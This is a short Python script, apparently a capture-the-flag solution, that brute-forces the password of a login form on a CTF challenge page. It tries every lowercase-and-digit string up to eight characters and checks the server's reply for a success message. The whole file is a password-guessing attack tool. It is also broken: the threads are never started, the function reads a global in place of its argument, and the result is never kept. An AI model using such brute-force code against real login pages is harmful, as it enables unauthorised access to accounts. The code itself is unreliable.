#/usr/bin/python3
import requests, re, itertools, string, threading
from string import ascii_lowercase

alvo = "https://summer2020.ctf.cert.rcts.pt/webhack-300.php"
password = ""

def test_password(password, attempts):
	post_data = {"password":pass_aux,"submit":"Login"}
	req = requests.post(alvo, data=post_data)
	response = re.findall(r'>Password(.+?)<', req.text)[1] # Procura por o que esta depois de Password

	if response != "incorrecta!!":
		password = pass_aux
		print("PASSWORD ENCONTRADA: " + password + "!!!!!!!!!!!!!!!!!")

chars = string.ascii_lowercase + string.digits
attempts = 0
for password_length in range(1, 9):
	for pass_aux in itertools.product(chars, repeat=password_length):
		attempts += 1
		pass_aux = ''.join(pass_aux)
		x = threading.Thread(target=test_password, args=(pass_aux, attempts))
		#print(pass_aux, attempts)

print("Password não encontrada")